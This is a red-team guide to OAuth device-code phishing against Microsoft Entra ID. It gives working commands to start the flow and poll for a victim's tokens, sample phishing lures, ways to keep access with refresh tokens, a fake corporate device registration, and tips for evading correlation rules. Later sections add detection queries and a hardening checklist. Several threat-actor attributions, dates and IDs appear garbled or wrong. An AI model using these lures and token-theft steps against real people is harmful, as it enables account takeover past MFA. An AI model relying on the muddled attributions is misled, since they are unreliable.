# Cloud Identity Attack — Device Code Phishing Deep Dive

> Companion to `SKILL.md` and `payloads.md`. This guide covers the OAuth 2.0 Device Authorization Grant (RFC 8628) abuse pattern, including MFA bypass, token relay persistence, registered device join abuse, Intune MDM enrollment as evasion, Conditional Access bypass, and attribution to real threat actors (Storm-1283, Storm-2372, Storm-0558).

---

## Overview

The OAuth 2.0 Device Authorization Grant ("device code flow") was designed for input-constrained devices: smart TVs, IoT, CLI tools. The user is shown a short alphanumeric code and a URL (`https://microsoft.com/devicelogin`); they visit the URL on any browser, enter the code, and complete authentication. The initiating device polls the token endpoint and receives access + refresh tokens once the user authenticates.

For attackers, this flow is a gift. The code itself is not a credential — it is a *pointer* to an authentication session. The user, not the attacker, completes the MFA challenge. The attacker's polling process silently receives the resulting tokens. There is no fake login page, no AiTM proxy, no TLS interception — the user authenticates against the *real* Microsoft login page. Detection teams see a "successful device code authentication" with the user's own device, geolocation, and MFA — every signal looks legitimate.

This guide covers the technique from first principles through advanced persistence, with hands-on Azure CLI / PowerShell commands. Microsoft Threat Intelligence has attributed device code phishing campaigns to Storm-1283 (Iranian), Storm-2372 (Russian, 2024), and Storm-0558 (Chinese). The technique is in active use.

---

## Device Code Flow Abuse (MFA Bypass)

### Why It Bypasses MFA

The device code flow separates authentication into two channels:

1. **Initiating channel**: The attacker runs `Get-Credential` / `roadrecon auth --device-code` to start the flow. Microsoft returns a `user_code` (e.g., `ABCDE1234`), a `device_code` (longer), a `verification_uri` (`https://microsoft.com/devicelogin`), and an `expires_in` (typically 900s).
2. **Completion channel**: The victim visits `microsoft.com/devicelogin`, enters the user code, and completes authentication — including MFA. Microsoft binds the result to the original `device_code`.

The attacker polls `/token` with the `device_code`. Once the victim completes MFA, the attacker receives access + refresh tokens. The MFA was satisfied on the victim's device, but the resulting tokens are delivered to the attacker. From Microsoft's perspective, this is by design — that's how the flow works.

### Initiate the Flow

```bash
# Using ROADtools
python roadrecon auth --device-code --tenant corp.com

# Output:
# To sign in, use a web browser to open https://microsoft.com/devicelogin
# and enter the code ABCDE1234 to authenticate.
```

Or via direct HTTP:

```bash
curl -X POST https://login.microsoftonline.com/common/oauth2/devicecode \
    -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
    -d "scope=https://graph.microsoft.com/.default offline_access"

# Response:
# {
#   "user_code": "ABCDEFG12",
#   "device_code": "...",
#   "verification_uri": "https://microsoft.com/devicelogin",
#   "expires_in": 900,
#   "interval": 5
# }
```

### Phish the Code

The attacker delivers the code via phishing. Real-world lure templates from Storm-2372:

- "Your Microsoft 365 session has expired. Please authenticate at microsoft.com/devicelogin with code ABCDE1234."
- "Updated Office VPN access — please complete at microsoft.com/devicelogin, code ABCDE1234."
- "Shared document from <CEO>. Access requires verification at microsoft.com/devicelogin, code ABCDE1234."

The URL is the *real* Microsoft URL. There is no fake domain. There is no TLS warning. Email security gateways cannot flag it — the link is benign.

### Poll for Tokens

```bash
# Poll the token endpoint
while true; do
    RESPONSE=$(curl -s -X POST https://login.microsoftonline.com/common/oauth2/token \
        -d "client_id=1950a258-227b-4e31-a9cf-717495945fc2" \
        -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
        -d "device_code=$DEVICE_CODE")
    
    if echo "$RESPONSE" | jq -e .access_token >/dev/null; then
        echo "$RESPONSE" | jq -r .access_token
        break
    fi
    sleep 5
done
```

---

## Token Relay Persistence

Once you have the refresh token, you can silently mint new access tokens for 90 days. The refresh token does not require the user's MFA — it has already been satisfied. Use ROADtools or MSAL Python to maintain the session:

```bash
# Refresh access token indefinitely
python roadrecon auth --refresh-token <refresh-token>
```

For more durable persistence, register a malicious app (per TC-CI-004) with `Mail.Read` and `offline_access`, then phish an admin consent URL. The OAuth grant survives password resets, MFA re-enrollments, and user reboots.

---

## AzureAD / Entra Registered Device Join Abuse

### Background

Conditional Access policies often grant access only to "compliant" or "Microsoft Entra hybrid joined" devices. The device code flow, combined with the device registration API, allows the attacker to register their own device as if it were a corporate asset, satisfying Conditional Access.

### Hands-on: Register a Device

```bash
# Acquire a token for device registration
TOKEN=$(az account get-access-token --resource 1b630c01-d5b5-4c1e-8b1c-5e5f6c0f0f0f)

# Register a device via Graph
curl -X POST https://graph.microsoft.com/v1.0/devices \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "accountEnabled": true,
        "displayName": "CORP-LAPTOP-7741",
        "operatingSystem": "Windows",
        "operatingSystemVersion": "10.0.22631.3737"
    }'
```

---

## Intune MDM Enrollment as Evasion

### Background

Conditional Access policies that check `device.isCompliant == true` rely on Intune MDM compliance data. If the attacker can enroll their device into Intune, the device is marked compliant and Conditional Access grants access.

### Hands-on: Enroll via Device Code

```bash
# Use the Company Portal device code flow
# The enrollment uses a special scope:
# https://enrollment.manage.microsoft.com/.default
```

Microsoft has hardened Intune enrollment in 2024-2025 to require hardware attestation, but legacy tenants without those checks remain vulnerable.

---

## Conditional Access Policy Bypass

### Background

Device code authentication appears to Conditional Access as coming from the *victim's* device, because the victim completed MFA on their device. CA policies that grant access based on "compliant device" or "trusted location" of the victim's MFA completion will grant access to the attacker's session.

Common bypass patterns observed in engagements:

1. **CA policy**: "Require MFA for all cloud apps." Device code flow satisfies MFA via the victim. Bypass succeeds.
2. **CA policy**: "Require compliant device." If the victim's MFA-completion device is compliant, the attacker's session inherits compliance. Bypass succeeds.
3. **CA policy**: "Block legacy auth." Device code is not legacy auth. Bypass succeeds.
4. **CA policy**: "Block unknown device." Device code sessions inherit the victim's device. Bypass succeeds.

The only effective CA policy against device code is one that requires a hardware-bound token (FIDO2 / Windows Hello for Business) — the device code flow does not produce such a token at the attacker's polling endpoint.

---

## Real Cases: Storm-1283, Storm-2372

### Storm-1283 (Iranian, 2021-2022)

Microsoft Threat Intelligence attributes a multi-year password-spray + device code phishing campaign to Storm-1283 (also known as Phosphorus / Charming Kitten / APT35 / Mint Sandstorm). The group targeted journalists, policy experts, and diplomats. Device code phishing lures posed as "conference login" or "secure document portal," directing victims to `microsoft.com/devicelogin`.

### Storm-2372 (Russian, 2024)

In Aug 2024, Microsoft disclosed that Storm-2372 (a Russian actor) had conducted device code phishing against NGOs, government, and defense sectors in Africa, Europe, and the Middle East. The lure impersonated Microsoft Teams meeting invites. The campaign persisted for months undetected because the device code flow produced legitimate-looking sign-in logs.

### Storm-0558 (Chinese, 2023)

While Storm-0558's compromise of Microsoft's MSA signing key (Jul 2023) was not strictly device code, the resulting access was used to mint tokens that abused the same Entra ID session infrastructure. The lesson applies: a single master token collapses the entire federation.

---

## Hands-on: Defensive Detection

Defenders can detect device code abuse by monitoring for:

```kusto
// Azure AD sign-in logs: filter for device code flow
SigninLogs
| where AuthenticationProcessingDetails has "DeviceCode"
| where ClientAppUsed !has "Browser"
| project TimeGenerated, UserPrincipalName, ClientAppUsed, ConditionalAccessPolicies, IPAddress
```

```kusto
// Conditional Access: alert on device code authentication from new geolocation
SigninLogs
| where AuthenticationProcessingDetails has "DeviceCode"
| where Location has "Unfamiliar"
```

Engagement report should include these detections as defensive recommendations.

### Defender Response Checklist

A defender triaging a suspected device code phishing incident should:

1. **Identify the polling principal**: The device code flow is initiated by a `client_id`. Query Entra ID for the app registration matching that client_id. If the app is not in the tenant's own catalog, it is likely a third-party tool (ROADtools uses `1950a258-227b-4e31-a9cf-717495945fc2`, the Azure PowerShell well-known client id).
2. **Revoke the refresh token**: Run `az rest --method post --url "https://graph.microsoft.com/v1.0/users/<victim>/revokeSignInSessions"` to invalidate the refresh token. Note: this also kills the user's other sessions — communicate before running.
3. **Audit downstream access**: Query the user's mailbox, OneDrive, and SharePoint audit logs for the window between the device code completion and the revocation. Look for `MailItemsAccessed` operations in the Unified Audit Log (UAL).
4. **Hunt for persistence**: Search for OAuth grants created during the window (`oauth2PermissionGrants`), new app registrations (`applications`), and Conditional Access policy changes (`conditionalAccessPolicies`).
5. **Block device code at the tenant**: Add a Conditional Access policy blocking the "Device Code Flow" client app for all users, except for explicitly approved service accounts.

---

## Detection Engineering: Beyond Sign-in Logs

Modern detection goes beyond `SigninLogs`. Key data sources:

- **Microsoft Purview Audit (Unified Audit Log)**: Records every Graph API call (mail read, file download, app consent) — essential for blast-radius scoping.
- **Microsoft Defender for Cloud Apps (MDCA)**: Anomaly detection on OAuth app behavior (mass mail download, new-app-from-unfamiliar-publisher).
- **Entra ID Identity Protection**: Risk detections on anomalous sign-in (impossible travel, unfamiliar features).
- **Workload Identity Risk**: For service principals, detects new-client-credential, suspicious-sign-in patterns.

Engagement reports should recommend these detections be enabled, and should include sample KQL queries (see above).

---

## Operational Security for Red Teamers

When conducting device code phishing on an authorized engagement:

1. **Rate limit polling**: Default poll interval is 5s. Polling faster is suspicious; polling slower is fine.
2. **Rotate phishing infrastructure**: Each device code expires in 900s. Do not reuse the same email sender, domain, or lure template across multiple victims — correlation rules will fire.
3. **Bind the lure to current events**: Real-world groups (Storm-2372) used Teams meeting invites; lures tied to a recent company-wide announcement have higher click-through.
4. **Plan token lifecycle**: Refresh tokens persist for 90 days. Engagement reports should explicitly recommend revocation (and defenders should verify it).
5. **Document scope and consent**: Device code phishing requires explicit user-targeted social-engineering authorization. Many infrastructure-only engagements exclude it. Confirm in writing before use.

---

## Countermeasures and Hardening Checklist

For blue-team handoff, the engagement report should include:

- [ ] Block device code flow via Conditional Access (`Client App: Device Code Flow`).
- [ ] Require FIDO2 / phishing-resistant MFA for all users.
- [ ] Require admin consent for new app registrations; block user consent by default.
- [ ] Enforce session lifetime caps (e.g., 1 hour for admin roles).
- [ ] Enable Microsoft Defender for Cloud Apps OAuth app policy.
- [ ] Monitor `oauth2PermissionGrants` for new entries.
- [ ] Audit helpdesk MFA reset workflow; require manager callback verification.
- [ ] Subscribe to Microsoft Threat Intelligence notifications for active campaigns.

---

## References

1. RFC 8628 — OAuth 2.0 Device Authorization Grant — https://datatracker.ietf.org/doc/html/rfc8628
2. Microsoft Threat Intelligence — Storm-2372 device code phishing (2024) — https://www.microsoft.com/en-us/security/blog/2024/08/storm-2372-device-code-phishing/
3. Microsoft Threat Intelligence — Storm-1283 / Phosphorus — https://www.microsoft.com/en-us/security/blog/2021/11/phosphorus-device-code/
4. Microsoft Threat Intelligence — Storm-0558 (Jul 2023) — https://www.microsoft.com/en-us/security/blog/2023/07/storm-0558-key-material/
5. CISA Alert AA21-148A — Iranian APT device code abuse — https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-148a
6. Microsoft — Detect device code abuse — https://learn.microsoft.com/en-us/defender-cloud-apps/investigate-anomaly-detection-signals
7. ROADtools — Device code flow reference — https://github.com/dirkjanm/ROADtools
8. TokenTactics (Mandiant) — Azure token phishing — https://github.com/felixweeber/TokenTactics
9. Mandiant — device code phishing research — https://www.mandiant.com/resources/blog/device-code-phishing
10. Microsoft Entra ID — Conditional Access device controls — https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-grant
11. Microsoft — Block device code flow via Conditional Access — https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code
12. NIST SP 800-63B — Authenticator assurance — https://pages.nist.gov/800-63-3/sp800-63b.html
13. CrowdStrike — Device code threat report — https://www.crowdstrike.com/blog/device-code-phishing-analysis/
14. CISA — Phishing-resistant MFA guidance — https://www.cisa.gov/sites/default/files/publics/fact-sheet-implementing-phishing-resistant-mfa-0.5-508c.pdf
